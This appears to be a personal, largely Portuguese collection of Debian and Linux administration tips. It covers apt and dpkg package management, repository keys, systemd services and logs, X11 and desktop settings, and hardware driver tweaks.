 > no meu source.list. Este é um repositório não oficial debian e nele tem uns pacotes debian para o mplayer meu player preferido smile

 > Quando eu dava um "apt-get update", este retornava o seguinte erro:

 >Lendo Lista de Pacotes` Pronto W: GPG error: ftp://ftp.nerim.net etch Release: As assinaturas a seguir não puderam ser verificadas devido a chave pública não estar disponível : NO_PUBKEY 07DC563D1F41B907 W: Você terá que executar apt-get update para corrigir esses arquivos faltosos E: Alguns arquivos de índice falharam no download, eles foram ignorados ou os antigos foram usados em seu lugar.

 > Resolvendo o problema

 > Deixando o blá, blá, blá de lado para resolver o problema basta instalar o pacote "debian-keyring" com o comando:

     apt-get install debian-keyring

 > e depois utilizar o comando:

    gpg --keyring /usr/share/keyrings/debian-keyring.gpg -a --export 07DC563D1F41B907 | apt-key add -

 > pronto problema resolvido. Doeu?

 > Lembre-se de colocar depois do export o número da chave que dá erro no seu apt-get update.

    gpg --receive-keys 84C573CD4E1AFD6C  --keyserver debian.org
    gpg -a --export 84C573CD4E1AFD6C |apt-key add -

### Chave expirada do archive ports
As seguintes assinaturas eram inválidas: EXPKEYSIG 84C573CD4E1AFD6C Debian Ports Archive Automatic Signing Key (2020)
```
wget https://www.ports.debian.org/archive_2020.key

gpg --import archive_2020.key
gpg --export 84C573CD4E1AFD6C | apt-key add -
```

### Abrir um pacote .deb

     dpkg --fsys-tarfile dosemu_1.2.2-8_i386.deb |tar -xf -

### 6.3.4 Recover package selection data

> If /var/lib/dpkg/status becomes corrupt for any reason, the Debian system loses package selection data and suffers severely. Look for the old /var/lib/dpkg/status file at /var/lib/dpkg/status-old or /var/backups/dpkg.status.*.

> Keeping /var/backups/ in a separate partition may be a good idea since this directory contains lots of important system data.

> If no old /var/lib/dpkg/status file is available, you can still recover information from directories in /usr/share/doc/.

    ls /usr/share/doc | \
    grep -v [A-Z] | \
    grep -v '^texmf$' | \
    grep -v '^debian$' | \
    awk '{print $1 " install"}' | \
    dpkg --set-selections

    dselect --expert # reinstall system, de-select as needed

### Linux-Libre
> deb https://linux-libre.fsfla.org/pub/linux-libre/freesh/ freesh main

    wget -O - https://jxself.org/gpg.asc | sudo apt-key add -

- Once your sources.list is updated you should also fetch and install the GPG key with which the repository is signed:

        wget -O - https://jxself.org/gpg.asc | sudo apt-key add -

- Confirm that it's the right key:

        apt-key finger

- Make sure that you see the fingerprint:

      F611 A908 FFA1 65C6 9958 4ED4 9D0D B31B 545A 3198

      wget http://linux-libre.fsfla.org/pub/linux-libre/freesh/archive-key.asc
      apt-key add archive-key.asc

### Compilar modulo para versão diferente do kernel corrente

    module-assistant -l 2.6.24 a-i atl2 --kernel-dir /usr/src/linux-source-2.6.24
    module-assistant --kernel-dir /usr/src/linux-headers-2.6.22-3

### List installed packages that are not official Debian packages:

    aptitude search '~S~i!~Odebian'
    apt list '~i!~Odebian'

> List essencial packages

    apt list '~i ~E'

> List automatic instaled packages

    apt list '~i ~M'

> List packages that do not exist on repositories

    apt list '~i ~o'

> List packages installed from non-free:

    apt list '~i~snon-free'
    apt list --installed non-free

> List packages installed from experimental:

    aptitude search ~S~i~Aexperimental

> List packages with 'ruby' and 'gtk' in their names:

    aptitude search 'ruby gtk'
    aptitude search ~nruby~ngtk

- List installed packages that depend on bash:

        aptitude search ~S~i~Dbash

- renomear vários arquivos

        rename 's/pict/dia4/' pict*.jpg

### update rc

    update-rc.d  cups defaults 20 80
	20 -> S20
	80 -> K80

    update-rc.d -f cups remove

### deborphan - procura pacotes órfãos

    deborphan -a mostra além das libs

### Para purgar tudo

    deborphan | tr '\n' ' ' | xargs apt purge -y
    apt purge  $(deborphan --guess-all | tr '\n' ' ')

To reinstall all the packages which localepurge has been taking care
of before, you can use the following command:

    apt-get --reinstall install $(dpkg -S LC_MESSAGES | cut -d: -f1 | tr ', ' '\n' | sort -u)

For your further usage, the file "/var/tmp/reinstall_debs.sh"

    apt-get -u --reinstall --fix-missing install $(dpkg -S LC_MESSAGES | cut -d: -f1 | tr ', ' '\n' | sort -u)


### Para usar versões antigas de distros Debian

    deb http://archive.debian.org/debian/ sarge contrib main non-free

### 6.3.4 Recover package selection data

If /var/lib/dpkg/status becomes corrupt for any reason, the Debian system loses package selection data and suffers severely. Look for the old /var/lib/dpkg/status file at /var/lib/dpkg/status-old or /var/backups/dpkg.status.*.

Keeping /var/backups/ in a separate partition may be a good idea since this directory contains lots of important system data.

If no old /var/lib/dpkg/status file is available, you can still recover information from directories in /usr/share/doc/.

     # ls /usr/share/doc | \
       grep -v [A-Z] | \
       grep -v '^texmf$' | \
       grep -v '^debian$' | \
       awk '{print $1 " install"}' | \
       dpkg --set-selections
     # dselect --expert # reinstall system, de-select as needed

imprimindo via linha de comando no cups
       cupsdoprint -P Lexmark_E230 -o Resolution=720dpi,Copies=1,PageSize=A4 inspecao.ps

### Purge all packages that have been removed except for their config files:
    aptitude purge ~c
    apt purge ?config-files
    apt purge ~c

    aptitude purge `dpkg --get-selections | grep deinstall | awk '{print $1}'`

    apt purge `dpkg --get-selections | grep deinstall | awk '{print $1}'`
    apt purge `dpkg -l |grep ^rc | awk '{print $2}'`
    apt purge $(dpkg -l | awk 'BEGIN {ORS=" "} /^rc/ {print $2}'

    aptitude purge $(dpkg --get-selections | awk '/deinstall/ {print $1}')
    apt purge $(dpkg --get-selections | awk '/deinstall/ {print $1}')
    apt purge `dpkg --get-selections | awk '$2 == "deinstall" {print $1}'`
    dpkg --get-selections | awk '$2 == "deinstall" {print $1}' | xargs -o apt purge

### Dir onde vão parar as listas dos repositórios
    /var/lib/apt/lists/

### Para ver de onde vem os pacote
    grep File /var/lib/apt/lists/* | grep "Filename:"|grep -v squeeze

### Resolvendo problema do localepurge
reinstalando pacotes cujos locales foram apagados
    apt-get --reinstall install $(dpkg -S LC_MESSAGES | cut -d: -f1 | tr ', ' '' | sort -u)

### Wireshark non super user
    dpkg-reconfigure wireshark-common
- colocar user no grupo wireshark

### para instalar extensões do libreoffice
    unopkg add extensão

### Para ver de onde vem os pacotes
    for i in `dpkg --get-selections | awk '{ print $1 }'`; do egrep -lRI "^Filename: .*/${i}_[^/]+.deb" /var/lib/apt/lists/ | grep -q 'sid' && echo $i; done

### Para colocar e tirar pacotes em hold
    aptitude hold pacote | aptitude unhold pacote

### Para ver os pacotes que estão hold
    aptitude search ~i|grep ^ih
    aptitude search ~ahold

    apt-mark hold chromium chromium-l10n chromium-common chromium-sandbox chromium-driver
    apt-mark unhold chromium chromium-l10n chromium-common chromium-sandbox chromium-driver

### Openjdk 7 no Ubuntu 10.04
    add-apt-repository ppa:webupd8team/java
    apt-get update
    apt-get install oracle-java7-installer

### ppas em distros deb
    add-apt-repository ppa:nemh/systemback

site:
http://ppa.launchpad.net/nemh/systemback

deb:
    deb http://ppa.launchpad.net/nemh/systemback/ubuntu yakkety main

### debian lenny archive mirror
    deb http://archive.debian.org/debian-security lenny/updates main contrib non-free
    deb http://archive.debian.org/debian/ lenny main contrib non-free

### Para fazer que um serviço não rode mesmo depois que é atualizado
    update-rc.d cups disable

### Para voltar ao normal
    update-rc.d cups defaults

### Para restaurar aquivos de conf "perdidos" missing
    aptitude reinstall -o Dpkg::Options::=--force-confmiss pacote
    apt reinstall -o Dpkg::Options::=--force-confmiss pacote

### Remover kernels antigos
    dpkg -l 'linux-*' | sed '/^ii/!d;/'"$(uname -r | sed "s/\(.*\)-\([^0-9]\+\)/\1/")"'/d;s/^[^ ]* [^ ]* \([^ ]*\).*/\1/;/[0-9]/!d' | xargs sudo apt-get -y purge

### Download sources.list

    wget -N -P /etc/apt/ kretcheu.com.br/sources.list

    wget https://raw.githubusercontent.com/kretcheu/dicas/master/sources.list -O /etc/apt/sources.list

    wget https://raw.githubusercontent.com/kretcheu/dicas/master/sources.list.non-free -O /etc/apt/sources.list

### Purgando de uma lista
    aptitude purge `cat /tmp/lista | tr '\n' ' '`

### Significado dos estados dos pacotes: dpkg -l

https://linuxprograms.wordpress.com/2010/05/11/status-dpkg-list/

### Removendo pacotes

    `dpkg --remove --force-all unity-editor`

### Incluindo arquitetura

    dpkg --add-architecture i386

### Vendo outras arquiteturas

    dpkg --print-foreign-architectures

### Vendo arquitetuara atual

    dpkg --print-architecture

### Removendo arquitetura

    dpkg --remove-architecture i386

### Pacotes não atuais
http://snapshot.debian.org/

### Checando os debsums dos pacotes.
    debsums -a >log 2>err
    grep -v OK log

### Para saber de qual(is) pacotes um pacote depende:
    aptitude why pacote
    apt rdepends --installed pacote
    python-wxgtk2.8

### Para alterar a cor do apt

    apt install rows -o Dpkg::Progress-Fancy::Progress-Bg="%1b[44m" --reinstall

- vide tabela em:
https://en.wikipedia.org/wiki/ANSI_escape_code#Colors

### Qdo o arquivo da lista dos pacotes no repo Sources.xy não está ok:
   E: Falhou ao buscar http://deb.debian.org/debian/dists/sid/main/source/Sources.xz
   File has unexpected size (7699560 != 7700052). Mirror sync in progress? [IP: 151.101.0.204 80]
   Hashes of expected file:
    - Filesize:7700052 [weak]
    - SHA256:98986d58fe8d13f190d58a5c9a4e0ada0900f4b257c2256effa61aa4cef9653c
    - MD5Sum:c95afec421c72f9126519e22c689f80b [weak]
   Release file created at: Sun, 24 Sep 2017 14:44:10 +0000

    service libvirtd start
    virsh list --all
    virsh start debian-stretch
    remote-viewer spice://localhost:5900

### This will apply to all hosts.

    Host *
    IPQoS=throughput

    echo 'Binary::apt::APT::Keep-Downloaded-Packages "true";' \
      > /etc/apt/apt.conf.d/01keep-debs

### Para saber a quantidade de pacotes
    for f in /var/lib/apt/lists/*Packages; do printf '%5d %s\n' $(grep '^Package: ' "$f" | wc -l) ${f###*/} ;done | sort -n


### Repositórios hurd
    deb http://deb.debian.org/debian-ports unstable main
    deb-src http://deb.debian.org/debian unstable main

### Chave do debian ports
    gpg --keyserver keyserver.ubuntu.com --recv DA1B2CEA81DCBC61
    gpg -a --export DA1B2CEA81DCBC61 | apt-key add

### Debian contribuidores
https://contributors.debian.org/contributors/flat

    udevadm info -q all -n /dev/input/event0

### Debian velho
http://cdimage.debian.org/cdimage/archive/

### Search apt using regular expression

    apt search --names-only '^gcc-[0-9]$'

### Para remover tudo do nvidia
    apt purge '^nvidia-.*'

### Comparar versões de pacotes

     dpkg --compare-versions 11a lt 100a && echo true
     true
     dpkg --compare-versions 11a gt 100a && echo true
     false

### Ajustes para firefox vir do sid
    cat /etc/apt/preferences.d/unstable

Package: *
Pin: release a=unstable
Pin-Priority: -1

    cat /etc/apt/preferences.d/firefox
Package: firefox
Pin: release a=unstable
Pin-Priority: 800

### Para ver as configurações do apt

   apt-config dump


### Para usar apt com proxy socks
Edite /etc/apt/apt.conf.d/01proxy
Incluindo:
`Acquire::http::proxy "socks5h://localhost:4000";`

Em outro terminal rode:
`ssh -D 4000 usuario@servidor-que-dara-conectividade`

agora só rodar apt

### Primeiro campo do dpkg -l

```
Desired action:
            u = Unknown
            i = Install
            h = Hold
            r = Remove
            p = Purge

          Package status:
            n = Not-installed
            c = Config-files
            H = Half-installed
            U = Unpacked
            F = Half-configured
            W = Triggers-awaiting
            t = Triggers-pending
            i = Installed

          Error flags:
            <empty> = (none)
            R = Reinst-required

```

### Usando lsblk com mais infos
```
lsblk -o name,mountpoint,label,size,uuid
lsblk -f
lsblk -o +UUID
```

### Descobrind badblocks e ajustando sistema de arquivos

```
badblocks -v /dev/sda1 > ~/bad_sectors.txt
e2fsck -l bad_sectors.txt /dev/sda1
```

Para verificar e reparar:
```
e2fsck -cfpv /dev/sda1
```

Para outros sistemas:
```
fsck -l bad_sectors.txt /dev/sda1

```

### Para ajustes no grub para dar boot em subvolumes btrfs

```
linux /@/boot/vmlinuz root=/dev/vda1 rootflags=subvol=@
initrd /@/boot/initrd.img
```

### Pacotes que "precisam ser reinstalados" mas não são encontrados
```
E: The package nome-pacote needs to be reinstalled, but I can't find an archive for it.
E: Internal error opening cache (1). Please report.
```

Remover de modo forçado.

```
dpkg --remove --force-all nome-pacote
```

Se falhar:

```
rm -i /var/lib/dpkg/info/nome-pacote.*
dpkg --remove --force-remove-reinstreq nome-pacote
```

Verifique se ficou integro:
```
apt update
```

### Para colocar uma ISO de Debian como repositório
Monte a iso:
```
mount debian-buster.iso /mnt
```
Inclua no sources.list
```
deb file:/mnt/ buster main
```

### resultados do dpkg descrição de cada campo

Description of each field

As you can see from the first three lines:

First letter -> desired package state ("selection state"):

    u ... unknown
    i ... install
    r ... remove/deinstall
    p ... purge (remove including config files)
    h ... hold

Second letter -> current package state:

    n ... not-installed
    i ... installed
    c ... config-files (only the config files are installed)
    U ... unpacked
    F ... half-configured (configuration failed for some reason)
    h ... half-installed (installation failed for some reason)
    W ... triggers-awaited (package is waiting for a trigger from another package)
    t ... triggers-pending (package has been triggered)

Third letter -> error state (you normally shouldn't see a third letter, but a space, instead):

    R ... reinst-required (package broken, reinstallation required)

### para sobrescrever arquivos de outro pacote

    dpkg -i --force-overwrite pacote.deb

# Systemd
<a href="#Dicas-ng">`^`</a>


### Systemd

    systemctl list-unit-files | grep enabled

    systemctl disable [UNIT]

### Comandos do systemctl

    systemctl --failed
    systemctl status
    systemctl reset-failed 
    systemctl status udev.service
    systemctl enable lightdm
    systemctl restart systemd-random-seed.service
    systemd-analyze blame
    systemctl list-units
    systemctl list-units --all
    systemctl list-dependencies  graphical.target
    systemctl list-units --all
    systemctl --state=not-found  --all
    systemctl mask cryptsetup.target
    systemctl unmask cryptsetup.target

    systemctl restart display-manager
    systemctl get-default
    graphical.target

    systemctl set-default graphical.target

    systemctl isolate multi-user.target
    systemctl isolate graphical.target
    systemctl isolate default

- Tempo de carregamento no boot de cada processo

        systemd-analyze
        systemd-analyze blame

> Listando serviços
- LIistando units

      systemctl
- Serviços ativos

        systemctl list-units -t service
> Gerenciando serviços
- Status do serviço ssh.service

        systemctl status ssh.service

- Parar serviço

        systemctl stop ssh.service

- Iniciar serviço

        systemctl start ssh.service

- Reiniciar serviço

        systemctl restart ssh.service

- Verificando se serviço SSH está ativo no boot

        systemctl is-enabled ssh.service

- Desabilitando serviço SSH no boot

        systemctl disable ssh.service
        systemctl disable ssh.service --now

- Habilitando serviço SSH no boot

        systemctl enable ssh.service
        systemctl enable ssh.service --now

- Exibindo detalhes do serviço (Unit File)

        systemctl cat ssh.service

> Obtendo logs

- Mensagens de boot do sistema

        journalctl -b
- Mensagens do sistema (syslog)

        journalctl -f
- Mensagens do sistema de hoje (syslog)

        journalctl -f --since=today

- Log's de um serviço específico (CRON)

        journalctl journalctl /usr/sbin/cron
        journalctl -b -u  networking.service

- Para não usar pager

        systemctl --no-pager

   ou usar a variável de ambiente:

        export SYSTEMD_PAGER=""

### Quando unmask não funciona
`systemctl unmask your_app.service` , but if your service link has been symlinked to /dev/null, this will fail. The following is the recommended process:

Check that the unit file is a symlink to /dev/null:

`file /lib/systemd/system/your_app.service`
It should return:

/lib/systemd/system/your_app.service: symbolic link to /dev/null
Delete the symlink:

`rm /lib/systemd/system/your_app.service`
Reload systemd daemon as you changed a service:

`systemctl daemon-reload`
`systemctl status 

### For instance, to show only entries logged at the error level or above, you can type:

        journalctl -p err -b

https://www.digitalocean.com/community/tutorials/how-to-use-journalctl-to-view-and-manipulate-systemd-logs

"EVENTOS DO SISTEMA"

    systemctl poweroff
    systemctl halt
    systemctl reboot
    systemctl suspend

 - Informações sobre o sistema

         hostnamectl

### Qdo deu erro systemd

    vi /var/lib/dpkg/info/systemd.postinst
-troquei: -e por -x
- rodei:

        systemd-tmpfiles --create --prefix /var/log/journal
      dpkg --configure systemd

### User service
    systemctl --user status rygel.service
    systemctl --user enable rygel.service

- Created symlink /home/kretcheu/.config/systemd/user/default.target.wants/rygel.service → /usr/lib/systemd/user/rygel.service.


### COntrolando espaço dos logs journalctl

Para dar o limite de 5d:

     journalctl --vacuum-time=5d

Verifique o diretório: /var/log/journal/
Típca mensagem no log:

```
System Journal (/var/log/journal/f5c00a17a7a2c3cfd281aef152b23450) is currently using 208.0M. Maximum allowed usage is set to 200.0M.
```

# Gráfico
<a href="#Dicas-ng">`^`</a>

### Iniciar o X sem mouse
- no /etc/X11/xorg.conf

- colocar em Server Layout

        Option "AllowMouseOpenFail"  "true"

### Mexer na control list do x via terminal (remoto por exemplo)

    xhost + si:localuser:root

### qdo der pau com o glx blender compiz na troca de kernel ou xorg
    cp /usr/lib/xorg/modules/extensions/libglx.so.185.18.14 /usr/lib/xorg/modules/extensions/libglx.so

- Normalmente quando isso acontece, vá até o diretório
    /usr/lib/xorg/modules/extensions
- e remova o libglx.so e crie um link simbólico para libglx.so.1xx.xx.xx

        ln -s /usr/lib/xorg/modules/extensions/libglx.so.1xx.xx.xx /usr/lib/xorg/modules/extensions/libglx.so

### Desligar monitor
    xset -display :0 dpms force off
    xset dpms force off

    xset dpms 300 600 900

### Ainda bem que você tem internet e vai ver essa dica.
Para restaurar esses botões no local direito, igual ao que era antes execute no terminal :

    gconftool-2 --type string --set "/apps/metacity/general/button_layout" "menu:minimize,maximize,close"

Se você desejar que todos os novos usuários criados em seu sistema também tenham essa modificação, execute também :

    sudo gconftool-2 --direct --config-source xml:readwrite:/etc/gconf/gconf.xml.defaults --type string --set "/apps/metacity/general/button_layout" "menu:minimize,maximize,close"

Assim novos usuários já terão o novo layout dos botões.
botões no gnome-shell

    gconftool-2 -s -t string /desktop/gnome/shell/windows/button_layout ":min
no gnome flashback

    gsettings set org.gnome.desktop.wm.preferences button-layout 'menu:minimize,maximize,close'

### Colocar o monitor para dormir com salva telas / automático
    xset -display :0 dpms force off


### A sequência para conseguir abrir a aplicação com sucesso seria:

   1. Logar na estação remota com usuário que você possui habilitando o X.
      (loguei como root);
   2. Confirmar o Display setado nas variáveis de ambiente (echo $DISPLAY) ;
   3. Verificar e copiar a linha que contém o "cookie" relacionado ao display
      setado em nossa seção (xauth list);
   4. Alternar para o usuário que deve ter o software configurado em seu perfil(
      su < usuario>);
   5. Adicionar o cookie do display ao novo usuário (xauth add < linha copiada
      no passo 3>);
   6. Executar a aplicação.

Um exemplo prático destes passos pode ser visto abaixo:

     info02@info02:~$ ssh -X root@compras03
     root@compras03's password:
     compras03:~# echo $DISPLAY
     localhost:10.0
     compras03:~# xauth list
     compras03/unix:11  MIT-MAGIC-COOKIE-1  e2564ead0158e22db6b243ed3008bdc8
     compras03/unix:10  MIT-MAGIC-COOKIE-1  4120ad75e0a2be45464d6aa8217a0d48
     compras03:~# su compras
     compras@compras03:/root$ xauth add compras03/unix:10  MIT-MAGIC-COOKIE-1  4120ad75e0a2be45464d6aa8217a0d48
     compras@compras03:/root$ xsane

### Trocar background do gdm
    xhost +
    su - Debian-gdm -s /bin/bash
    gnome-control-center --overview

### gnome-shell
    apt-get source gnome-shell
    apt-get build-dep gnome-shell
    dpkg-buildpackage -us -uc

### How to remove Gnome 3 Extensions?
take a look in /home/.local/share/gnome-shell/extensions or /usr/share/gnome-shell/extensions,
thats where it was hiding for me.

### Mudar uma tecla
- descobrir o keycode

    xev está no pacote: xbase-clients

        xmodmap -e 'keycode 135 = slash question'

### Veificando o código e o caracter associado.

    xev | awk -F'[ )]+' '/^KeyPress/ { a[NR+2] } NR in a { printf "%-3s %s\n", $5, $8 }'

### Tap no lxde Synaptics

    /etc/X11/xorg.conf.d/synaptics.conf

    Section "InputClass"
        Identifier      "Touchpad"                      # required
        MatchIsTouchpad "yes"                           # required
        Driver          "synaptics"                     # required
        Option          "MinSpeed"              "0.5"
        Option          "MaxSpeed"              "1.0"
        Option          "AccelFactor"           "0.075"
        Option          "TapButton1"            "1"
        Option          "TapButton2"            "2"     # multitouch
        Option          "TapButton3"            "3"     # multitouch
        Option          "VertTwoFingerScroll"   "1"     # multitouch
        Option          "HorizTwoFingerScroll"  "1"     # multitouch
        Option          "VertEdgeScroll"        "1"
        Option          "CoastingSpeed"         "8"
        Option          "CornerCoasting"        "1"
        Option          "CircularScrolling"     "1"
        Option          "CircScrollTrigger"     "7"
        Option          "EdgeMotionUseAlways"   "1"
        Option          "LBCornerButton"        "8"     # browser "back" btn
        Option          "RBCornerButton"        "9"     # browser "forward" btn
    EndSection


### Várias telas

    #!/bin/sh

    for cada in `seq 1 4` ; do xrandr --setprovideroutputsource $cada 0 ; done

    xrandr --output DVI-3-2 --auto
    sleep 2
    xrandr --output DVI-1-0 --auto
    sleep 2
    xrandr --output DVI-4-3 --auto
    sleep 2
    xrandr --output DVI-2-1 --auto
    sleep 2

    sleep 2

    xrandr --output DVI-3-2 --mode 1920x1080 --pos 0x900 --rotate normal --output VIRTUAL1 --off --output DVI-1-0 --mode 1440x900 --pos 1587x0 --rotate normal --output DP1 --off --output HDMI2 --off --output HDMI1 --primary --mode 1920x1080 --pos 1920x900 --rotate normal --output eDP1 --off --output DVI-4-3 --mode 1366x768 --pos 3840x900 --rotate normal --output DVI-2-1 --mode 1440x900 --pos 3027x0 --rotate normal

    xrandr > /tmp/xrandr

### Tem que identificar o Philips, que é o único 1368x768 por padrão

    VIDEO_PH=`cat /tmp/xrandr | grep -B1 "1366x768" | grep "DVI-" -A1 | head -n1 | cut -d" " -f1`
    MODELINE=`gtf 1368 768 75 | grep Modeline | cut -d" " -f4- | tr -d '"'`

    xrandr --newmode $MODELINE
    xrandr --addmode $VIDEO_PH 1368x768_75.00
    xrandr --output $VIDEO_PH --mode 1368x768_75.00 --pos 3840x969 --rotate normal

### Capturar camera com mplayer
    mplayer -tv driver=v4l2:gain=1:width=1280:height=720:device=/dev/video0:fps=10:outfmt=rgb16 tv://

### Restaurar painel

    dconf dump /org/mate/panel/objects/ >painel

### Editar arquivo painel e incluir objetos

[object-3]
toplevel-id='top'
action-type='search'
position=1012
object-type='action'
panel-right-stick=false

    dconf load /org/mate/panel/objects/ <painel

    dconf dump /org/mate/panel/general/
    [/]
    show-program-list=true
    default-layout='kretcheu-tweak'
    toplevel-id-list=['top']
    history-mate-run=['/usr/bin/gresolver', '/opt/atraci/Atraci']
    object-id-list=['menu-bar', 'notification-area', 'clock', 'show-desktop', 'object_0']

- inclui com dconf-editor

      object-id-list=['menu-bar', 'notification-area', 'clock', 'show-desktop', 'object_0', 'object-3']

### dconf tips

Dump all settings to a file:

    dconf dump / >~/.config/dconf/user.conf

Open that file on a text editor and select the settings that you care about:

    editor ~/.config/dconf/user.conf

If you don't know the name of the setting, but know how to modify it from a GUI like unity-control-center, run:

    dconf watch /

and then modify them. The exact setting will then appear on the terminal.
When you want to restore those settings, run:

    dconf load / <~/.config/dconf/user.conf


### Magnet link firefox

1. Open Firefox and type in about:config in the Address Bar and hit Enter.
2. Type in enter handler.expose in the search box at the top of the list.
3. right click - New - Boolean
4. Enter the preference name network.protocol-handler.expose.magnet
5. Set its value to false
6. Click on the magnet link and you should see Firefox’s Launch Application Choose Dialog
7. Select your torrent client.

### Editar o layout de teclado
- adaptar os layouts existentes em:

        /usr/share/X11/xkb/symbols/

- para o modo texto alterar arquivo:

        /etc/default/keyboard

- Recarregar mapa de teclado keyboard

        setxkbmap -layout jp
        setxkbmap jp

 ### Desbiltei apparmor para máquina virtuais linux 4.18

    cd /etc/apparmor.d/disable/
    ln -s ../usr.sbin.libvirtd

### disable/enable teclado (keyboard)
    xinput disable "AT Translated Set 2 keyboard"
    xinput enable "AT Translated Set 2 keyboard"

- De modo temporário rode:

         xinput list
- veja o id de AT Translated Set 2 keyboard
daí rode:

         xinput float <id#>
       como em: `xinput float 12`

- Disabilitando no kernel

Incluir no /etc/defaut/grub

         GRUB_CMDLINE_LINUX_DEFAULT="quiet i8042.nokbd

         update-grub

         initcall_blacklist=atkbd_init_module


### Prevent user to change wallpaper

As root run gconf-editor: gksudo gconf-editor. In the left pane find / desktop / gnome / background. On the right panel, find picture_filename, right click on it and select Set as Mandatory.

### lightdm - para ver as confs
    /usr/sbin/lightdm --show-config

### Xnest and Xephyr

    Xnest :1 -query 192.168.100.248
    Xephyr :1 -query 192.168.100.248 -fullscreen
    Xephyr :1 -query 192.168.100.248 -screen 1240x800

### Zika do .Xauthority .xauthority

    su - lightdm
    xauth generate :0 . trusted

### Default File-manager
Para verificar(1) e/ou alterar(2) o Gerenciador de arquivos padrão.

(1) `xdg-mime query default x-directory/normal`   
(2) `xdg-mime default /usr/share/applications/pcmanfm.desktop x-directory/normal`

(1) `gio mime inode/directory`   
(2) `gio mime inode/directory caja-folder-handler.desktop`

Para definir o default pode ser editando ~/.config/mimeapps.list

    [Default Applications]
    inode/directory=my-app.desktop

    update-desktop-database ~/.local/share/applications

### Para poder definir as janelas sem decoração no Mate

`apt install mate-netbook`

Daí com mate-tweak -> janelas -> Comportamento das janelas -> Ocultar decoração de janelas maximizadas  
ou  
`gsettings set org.mate.maximus undecorate true`

### Listar chaves recursivamente
`gsettings list-recursively org.mate.power-manager |sort`

### Desabilitar automount no Mate Gnome
Rode:
    `dconf-editor`\
Mate:\
Selecione: org > mate > desktop > media-handling\
desligue *automount* e *automount-open*.

Gnome:\
Selecione: org > gnome > desktop > media-handling\
desligue *automount* e *automount-open*.

### Checar a resolução usando o navegador
<https://bestfirms.com/what-is-my-screen-resolution/>

### Como se livrar do tearing no Firefox
    about:config
    layers.acceleration.force-enabled
    true

### ALterar tema de ícones na unha!

Editar o arquivo:
    ~/.icons/default/index.theme

### Sessões de ambientes gráficos

Disponíveis:
     /usr/share/xsessions/

Definidas para os usuários:

     /var/lib/AccountsService/users

### Para ver dispositivos de vídeo presentes e conectados ou não

     ls -l /sys/class/drm/*/status
     cat /sys/class/drm/*/status

```
ls /sys/class/drm/*/status | awk -F "/" 'BEGIN {ORS=" "} { print $5; system ("cat " $0)}
ls /sys/class/drm/*/status | awk -F "/" 'BEGIN {ORS=" "} { print $5"\t->"; system ("cat " $0)}'
```

### Para desabilitar o wayland no gdm3
Edita o arquivo: /etc/gdm3/daemon.conf
e descomente a linha: WaylandEnable=false

     systemctl restart gdm3

### logando num servidor C passando pelo B com X forward

```
ssh -Xtt -p 2222 ip-b ssh -X ip-c
ssh -Xtt -p 2222 virg ssh -X 192.168.122.75
```

### Exportar mapa de teclado atual e importar
```
xkbcomp -xkb $DISPLAY mapa
xkbcomp -w 0 mapa $DISPLAY
```

### habilitar tap no gdm

```
sudo su - gdm -s /bin/bash
export $(dbus-launch)
gsettings set org.gnome.desktop.peripherals.touchpad tap-to-click true
```

# Hardware
<a href="#Dicas-ng">`^`</a>

### Drivers de Webcams

 - O driver chama-se GPCA - Generic Software Package for Camera Adapters e pode ser encontrado no site mxhaard.free.fr

### Para Funcionar o controle de brilho no note

    modprobe video
    cat /proc/acpi/video/VGA/LCD/brightness

### Exemplo configurando pra 20% (?) do brilho

    echo 20 > /proc/acpi/video/VGA/LCD/brightness

### No ASUS

    /sys/class/backlight/intel_backlight/brightness
    /sys/class/backlight/intel_backlight/max_brightness

### Descobrir qual módulo uma interface de rede está usando

    ethtool -i eth0

### Qdo a placa de rede forcedeath incrementa ethXX
- no arquivo:

        /etc/udev/rules.d/50-udev.rules

- inclui:

        # workaround for increment eth
        SUBSYSTEM=="net", DRIVERS=="forcedeth", NAME="eth0"

- logo acima da entrada do scsi

### Recarregar rules do udev (debian)
    udevadm control --reload-rules

### logkeys

    cat /proc/bus/input/devices
    ls -l /dev/input/by-path/|grep kbd

### Erro do módulo pcspk
Driver 'pcspkr' is already registered, aborting`

    echo 'blacklist snd-pcsp' >> /etc/modprobe.d/blacklist.conf

### erro de rfkill
    rfkill list
    rfkill unblock 0

    rfkill block wifi
    rfkill unblock wifi

### quando rfkill mostra ideapad blocked
```
rfkill
0: ideapad_wlan: Wireless LAN
    Soft blocked: no Hard blocked: yes

modprobe -r ideapad_laptop
echo "blacklist ideapad_laptop" > /etc/modprobe.d/idepad.conf
```

### As a root, create a file with a name like asus-wifi.conf in /etc/modprobe
    options asus_nb_wmi wapf=1

### Atheros AR9271 USB dongle não conecta

    echo "options ath9k_htc nohwcrypt=1" | tee /etc/modprobe.d/ath9k.conf
    modprobe -rfv ath9k_htc
    modprobe -v ath9k_htc

### Re-plug the stick. If it gets too hot reduce the current:

    echo 'KERNEL=="wlan*", ACTION=="add", RUN+="/sbin/iwconfig wlan0 txpower 15"' | sudo tee /etc/udev/rules.d/10-wlan-stick.rules
    sudo service udev reload

    sudo service udev restart

### Criando entrada no apple

    modprobe dm-mod
    grub-install --target=x86_64-efi --efi-directory=/boot/efi --bootloader-id=Debian --recheck --debug
    mkdir -p /boot/grub/locale
    cp /usr/share/locale/en\@quot/LC_MESSAGES/grub.mo /boot/grub/locale/en.mo

    grub-install --target=i386-pc --recheck /dev/sdb

    grub-install --target=i386-efi --efi-directory=/boot --bootloader-id=grub_uefi --recheck

### Criando entrada UEFI

    efibootmgr -c -d /dev/sda -p 1 -L "Debian" -l "\EFI\debian\grubx64.efi"

    -c criar
    -d /dev/sda -> disco
    -p 1        -> partição EFI
    -L          -> nome da entrada
    -l          -> qual loader será carregado

### Verificando se está com secure boot

    mokutil --sb-state

### Mac address variavel ath9k
colocar no:

    /etc/modprobe.d/ath9k.conf
    options ath9k nohwcrypt=1
ou

    modpobre ath9k nohwcrypt=1

### Desabilitar os novo nome de interface de rede
As root, in the file `/etc/default/grub`

Add `net.ifnames=0 biosdevname=0` to the kernel command line in your grub config.

To do so, change the following line

    GRUB_CMDLINE_LINUX="net.ifnames=0 biosdevname=0"

    update-grub

### Add parameter i8042.nokbd,

    GRUB_CMDLINE_LINUX_DEFAULT="quiet splash i8042.nokbd"
Update grub as following command

    $sudo update-grub

### Para ver confs do modprobe
    modprobe -c

- exemplo:

        modprobe -c|grep ath3|grep 3014

### Para ver se o módulo ath3k tem uma placa com ID 3014
    alias usb:v04CAp3014d*dc*dsc*dp*ic*isc*ip*in* ath3k

### Bluetooth error msg sap
    vi /lib/systemd/system/bluetooth.service

- change
